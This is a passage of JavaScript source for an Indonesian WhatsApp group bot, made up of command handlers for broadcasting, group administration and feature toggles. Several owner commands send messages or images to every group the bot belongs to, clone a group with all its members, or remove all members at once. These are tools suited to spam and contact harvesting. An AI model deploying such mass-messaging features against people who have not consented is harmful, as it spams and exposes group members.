case 'jpmimg': {
if (!isCreator) return reply(`Fitur khusus Owner`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
let getGroups = await RezzHost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await RezzHost.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await RezzHost.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await RezzHost.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcimg2': {
if (!isCreator) throw mess.owner;
if (!text) return reply2(`Reply foto dengan caption ${prefix + command} Tes`)
if (!/image/.test(mime)) return reply(`Reply foto dengan caption ${prefix + command} Tes`)
let getGroups = await RezzHost.groupFetchAllParticipating();
let groups = Object.entries(getGroups)
.slice(0)
.map((entry) => entry[1]);
let anu = groups.map((v) => v.id);
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `\n${text}`
RezzHost.sendMessage(apaan, {image: buffer, caption: txt}, {quoted: m})
}
reply('Sukses Broadcast')
}
break
case 'bcimg': {
if (!isCreator) return reply(`Khusus Owner`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await loading()
let getGroups = await RezzHost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await RezzHost.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await RezzHost.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await RezzHost.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'listown':
if (isBan) return reply(mess.ban)
const lown = global.rowner
 teksooo = '*List Owner*\n\n'
for (let i of lown) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${lown.length}*`
RezzHost.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:kalgans, contextInfo: { "mentionedJid": owner } })
break
case 'delsesi': {
                if (!isCreator) return reply(mess.owner)
                fs.readdir("./RezzSession", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("Menghapus file sampah...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./RezzSession/${file}`)
                    });
                    await sleep(2000)
                    reply("Berhasil menghapus semua sampah di folder session")
                });
            }    
            break
case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply(mess.owner)
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await RezzHost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
RezzHost.sendMessage(i, {text: `${text}`}, {quoted:kalgans})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'creategc':{

if (!isCreator) return reply2(mess.owner)
if (!text) return reply2("Nama groupnya?")
let cret = await RezzHost.groupCreate(text, [])
let response = await RezzHost.groupInviteCode(cret.id)
let teks = `\`\`\`「  CREATION GROUP MESSAGE  」\`\`\`
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
RezzHost.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
RezzHost.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case 'cekip': case 'ip': {
  if (args.length !== 1) {
    return reply('Format salah! Penggunaan: cekip link');
  }

  const link = args[0];

  dns.resolve4(link, (err, addresses) => {
    if (err) {
      return reply('Gagal melakukan DNS reverse lookup.');
    }

    if (addresses.length === 0) {
      return reply('Tidak ada alamat IP yang ditemukan.');
    }

    const ip = addresses[0];
    reply(`Alamat IP dari ${link} adalah: ${ip}`);
  });
  }
  break
case 'cekidgc': {
if (!isCreator) return reply(mess.premium)
let getGroups = await RezzHost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await RezzHost.groupMetadata(x)
teks += `
╭────────────────────────
│『 *Group Info* 』
├────────────────────────
◉ Nama : ${metadata2.subject}
◉ ID : ${metadata2.id}
◉ Member : ${metadata2.participants.length}
├────
╰────────────────────────\n\n
`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'autojpm': {
if (!isCreator) return reply2(mess.owner)
if (!m.isGroup) return reply(mess.group) 
await loading()
if (args.length < 1) return reply2('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "enable") {
if (chats.autojpm) return reply2('Sudah Aktif')
chats.autojpm = true
reply2('Succes menyalakan jpm di group ini 🌷')
} else if (args[0] === "disable") {
if (!chats.autojpm) return reply2('Sudah Mati')
chats.autojpm = false
reply2('Succes mematikan jpm di group ini 🌷')
} else {
reply2('enable untuk mengaktifkan, disable untuk menonaktifkan')
}
}
break

case 'addprem': {
        if (!isCreator) return m.reply(mess.owner)
        function no(number) {
          return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        let hl = [];
        hl[0] = text.split(" ")[0];
        hl[0] = no(hl[0]) + "@s.whatsapp.net";
        hl[1] = text.split(" ")[1];
        if (!text) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: .addprem @${m.sender.split("@")[0]} 30`);
        let user = global.db.data.users
        if (typeof user[hl[0]] == "undefined")
          throw `Pengguna Tersebut Tidak Mendaftarkan Diri Ke ${namebot}`;
        let jumlahHari = 86400000 * hl[1];
        let now = new Date() * 1;
        user[hl[0]].premium = true;
        if (now < user[hl[0]].expired)
          user[hl[0]].expired += jumlahHari;
        else user[hl[0]].expired = now + jumlahHari;
        m.reply(`[✓] Selamat Kak *@${hl[0].split("@")[0]}* Telah Menjadi premium User Selama *${hl[1]}* Hari\n\nDetail premium: *${msToDate(user[hl[0]].expired - now)}*`);
        }
        break
      case 'delprem': {
        if (!isCreator) return m.reply(mess.owner);

        function no(number) {
          return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        if (!text) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: @${m.sender.split("@")[0]}`);
        let cleanText = no(text) + "@s.whatsapp.net";
        if (global.db.data.users[cleanText]) {
          global.db.data.users[cleanText].premium = false;
          global.db.data.users[cleanText].expired = 0;
          m.reply(`[✓] Permintaan Menghapus Premium User @${cleanText.split("@")[0]}.`);
        } else {
          m.reply(`[ ! ] User tidak ditemukan.`);
        }
        }
        break;
        
        case 'listpremium':
      case 'listprem': {
        let user = global.db.data.users;
        var key = "";
        var i = 1;
        for (let jid in user) {
          if (user[jid].premium) {
            key += `\n\n${i}. @${jid.replace(/@.+/, "")}\n        *Expired* : ${msToDay(user[jid].expired - new Date() * 1)}`;
            i += 1;
          }
        }
        return reply(`Pengguna Premium : ${i - 1}\n${key}`);
      }
      break
// BATAS OWNERMENU


// GroupMenu 
case 'invite': {
	if (!m.isGroup) return m.reply(mess.group)
	if (!isBotAdmins) return m.reply(`khusus admin bang`)
if (!text) return m.reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 628xxx`)
if (text.includes('+')) return m.reply(`Enter the number together without *+*`)
if (isNaN(text)) return m.reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await RezzHost.groupInviteCode(group)
      await RezzHost.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        m.reply(` An invite link is sent to the user`) 
}
break
case 'cekasalmember': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
  const participants = await RezzHost.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  reply(replyMessage);
  }
  break;
case 'mute': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
                if (args[1] === "enable") {
                if (chats.mute) return reply(`Sudah Aktif Sebelumnya`)
                chats.mute = true
                reply(`${pushname} telah di mute di group ini !`)
                } else if (args[1] === "disabld") {
                if (!chats.mute) return reply(`Sudah Tidak Aktif Sebelumnya`)
                chats.mute = false
                reply(`${pushname} telah di unmute di group ini !`)
                }
             }
             break
case 'cekmember': {
if (!isCreator) return reply2(mess.owner)
if (!text) return reply2("Id Nya Mana Kak?")
let cekmd = await RezzHost.groupMetadata(text)
let txrk = `乂 *C E K - M E M B E R*\n\n   ◦  *Nama Group :* ${cekmd.subject}\n   ◦  *Member :* ${cekmd.participants.length} Orang\n\n${footer}`
RezzHost.sendMessage(m.chat, {
                        text: txrk,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
}
break   
case 'inspect': {
if (isBan) return reply2(mess.ban)
await loading()
if (!args[0]) return reply2("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply2("Link Invalid")
RezzHost.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ${botname}`
try {
pp = await RezzHost.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
RezzHost.sendFile(from, pp, "", m, { caption: tekse, mentions: await RezzHost.parseMention(tekse) })

})
}
break
case 'totag': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
RezzHost.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break       
case 'linkgroup': case 'linkgc': case 'gclink': {
if (!isRegistered) return reply2(mess.regis)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
let response = await RezzHost.groupInviteCode(from)
RezzHost.sendText(from, `
📛 *Name :* ${groupMetadata.subject}
👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}
🌱 *ID :* ${groupMetadata.id}
👥 *Member :* ${groupMetadata.participants.length}
🔗 *Link :* https://chat.whatsapp.com/${response}
`, m, { detectLink: true })
}
break
case 'resetlinkgc':
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
RezzHost.groupRevokeInvite(from)
break
case 'sendlinkgc': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
if (!args[0]) return reply2(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${owner}`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await RezzHost.groupInviteCode(from)
RezzHost.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
case 'kick': case 'buang': case 'keluarkan': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(from, [users], 'remove')
reply2(mess.done)
}
break
case 'add': case 'tambahmem': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(from, [users], 'add')
reply2(mess.done)
}
break
case 'promote':
case 'pm': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(from, [users], 'promote')
reply2(mess.done)
}
break
case 'demote':
case 'dm': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await RezzHost.groupParticipantsUpdate(from, [users], 'demote')
reply2(mess.done)
}
break
case 'hidetag':
case 'h': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
RezzHost.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:kalgans})
}
break
case 'leave':
case 'out': {
if (!isCreator) return reply2(mess.owner) 
                await RezzHost.groupLeave(m.chat)
                await reply(`Done Leave ${pushname} ✅`)
            }
            break
case 'listonline': case 'liston': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
let online = [...Object.keys(store.presences[m.chat])]
if (online.length < 1) return m.reply(Func.texted('bold', `🚩 The system does not detect members who are online.`))
reply(online.map(v => '◦  @' + v.replace(/@.+/, '')).join('\n'))
}
break
case 'setname': case 'setsubject': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
if (!text) throw 'Text ?'
await RezzHost.groupUpdateSubject(m.chat, text).then((res) => reply2(mess.success)).catch((err) => reply2(jsonformat(err)))
}
break
case 'setdeskgc': case 'setdesk': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
if (!text) throw 'Text ?'
await RezzHost.groupUpdateDescription(m.chat, text).then((res) => reply2(mess.success)).catch((err) => reply2(jsonformat(err)))
}
break
case 'kickall':
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
var groupe = await RezzHost.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RezzHost.groupParticipantsUpdate(from, mems, 'remove')
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
    await RezzHost.removeProfilePicture(from)
    }
    break
case 'opentime': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
RezzHost.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break
case 'closetime': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
RezzHost.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break
case 'ephemeral': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!text) return reply('Enter the value enable/disable')
if (args[0] === 'enable') {
await RezzHost.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await RezzHost.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
case'clone':{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`Contoh : ${prefix+command} nama grup`)
let nameGroup = `${text}`
try {
await RezzHost.sendMessage(from, { text: `*Cloning Group Dan Semua Member Start*`, }, { quoted: kalgans });
const group = await RezzHost.groupCreate( `${nameGroup}`, groupparticipants);
await RezzHost.groupSettingUpdate(group.id, "locked");
await RezzHost.sendMessage(group.id, { text: `*Hallo Selamat datang semua di Group ${nameGroup}*`});
await RezzHost.groupSettingUpdate(group.id, "not_announcement");
reply(`Succes Clone Grup\nNama Grup : ${nameGroup}`)
} catch (err) {
reply(`Gagal Clone Grup : ${err.message}`)
}
}
break
case 'editgroup': {   
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
await loading()
if (args[0] === 'close'){
await RezzHost.groupSettingUpdate(from, 'announcement').then((res) => reply2(`Sukses Menutup Group`)).catch((err) => reply2(jsonformat(err)))
} else if (args[0] === 'open'){
await RezzHost.groupSettingUpdate(from, 'not_announcement').then((res) => reply2(`Sukses Membuka Group`)).catch((err) => reply2(jsonformat(err)))
} else {
RezzHost.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:kalgans}) 
 }
}
break
case 'editinfo': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
await loading()
 if (args[0] === 'open'){
await RezzHost.groupSettingUpdate(from, 'unlocked').then((res) => reply2(`Sukses Membuka Edit Info Group`)).catch((err) => reply2(jsonformat(err)))
 } else if (args[0] === 'close'){
await RezzHost.groupSettingUpdate(from, 'locked').then((res) => reply2(`Sukses Menutup Edit Info Group`)).catch((err) => reply2(jsonformat(err)))
 } else {
 RezzHost.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:kalgans}) 

}
}
break
case 'editsubjek': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!text) throw 'Text nya ?'
await loading()
await RezzHost.groupUpdateSubject(from, text).then((res)).catch((err) => reply2(jsonformat(err)))
}
break
case 'editdesk':{
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!text) throw 'Text Nya ?'
await loading()
await RezzHost.groupUpdateDescription(from, text).then((res)).catch((err) => reply2(jsonformat(err)))
}
break
case 'tagall': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *✉️ Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
RezzHost.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:kalgans })
}
break
case'demoteall':
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
await loading()
var groupe = await RezzHost.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RezzHost.groupParticipantsUpdate(from, mems, 'demote')
break
case 'promoteall':
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
await loading()
var groupe = await RezzHost.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RezzHost.groupParticipantsUpdate(from, mems, 'promote')
break
case 'welcome': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *REZZ BOTZZ - MD* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`
Ketik *enable* Untuk mengaktifkan ${command}
Ketik *disable* Untuk menonaktifkan ${command}
                    `),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".welcome-on/of enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".welcome-on/of disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'welcome-on/of':{
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
if (args.length < 1) return m.reply('ketik enable untuk mengaktifkan\nketik disable untuk menonaktifkan')
if (args[0] === "enable") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await RezzHost.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RezzHost.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:kalgans})
} else if (args[0] === "disable") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break
case 'antibot': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *REZZ BOTZZ - MD* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`
Ketik *enable* Untuk mengaktifkan ${command}
Ketik *disable* Untuk menonaktifkan ${command}
                    `),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".antibot-on/off enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".antibot-on/off disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'antibot-on/off':
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('kusus Bot Admin')
if (args[0] == 'enable'){
if (chats.antibot) return reply('UDAH ON!')
chats.antibot = true
reply('Fitur antibot telah di aktifkan')
} else if (args[0] == 'disable'){
if (!chats.antibot) return reply('UDAH OFF!')
chats.antibot = false
reply('Fitur antibot telah di matikan')
} else reply('enable / disable')
break
case 'antilink': {
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (!isBotAdmins) return reply('Bot harus admin')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *REZZ BOTZZ - MD* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`
Ketik *enable* Untuk mengaktifkan ${command}
Ketik *disable* Untuk menonaktifkan ${command}
                    `),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".antilink-on/off enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".antilink-on/off disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'antilink-on/off':
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins && !isCreator) return reply2('Ngapain hah?')
if (args[0] == 'enable'){
if (chats.antilinkgc) return reply('UDAH ON!')
chats.antilinkgc = true
reply('Fitur antilink telah di aktifkan')
} else if (args[0] == 'disable'){
if (!chats.antilinkgc) return reply('UDAH OFF!')
chats.antilinkgc = false
reply('Fitur antilink telah di matikan')
} else reply('enable / disable')
break 
case 'antipromosi':
